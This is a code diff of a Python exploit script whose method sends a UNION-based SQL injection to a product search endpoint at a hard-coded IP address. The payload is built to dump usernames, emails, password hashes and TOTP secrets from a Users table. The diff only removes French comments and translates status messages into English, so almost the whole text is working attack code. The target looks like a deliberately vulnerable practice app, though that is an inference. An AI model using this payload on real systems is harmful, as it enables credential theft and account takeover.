@@ -7,28 +7,22 @@ class UserCredentials:
         self.headers = {"Content-Type": "application/json"}
 
     def db_drop(self):
-        # Endpoint cible
         endpoint = f"{self.base_url}/rest/products/search"
-        print(endpoint)
         
-        # Paramètres de la requête
         payload = {
             "q": "banana')) UNION SELECT username, email, password, totpSecret, 5, 6, 7, 8, 9 FROM Users--"
         }
-        print(payload)
         
         try:
-            # Envoi de la requête GET
             response = self.session.get(endpoint, params=payload, headers=self.headers)
             
-            # Affichage de la réponse
             if response.status_code == 200:
-                print("Requête réussie !")
+                print("Success ! User Credentials table has been retrieve.")
                 return response.text
             else:
-                print(f"Requête échouée avec le code HTTP {response.status_code}.")
+                print(f"Fail with http code {response.status_code}.")
         except Exception as e:
-            print(f"Une erreur est survenue : {e}")
+            print(f"An error as occured : {e}")
 
 def main():
     base_url = "http://45.76.47.218:3000"
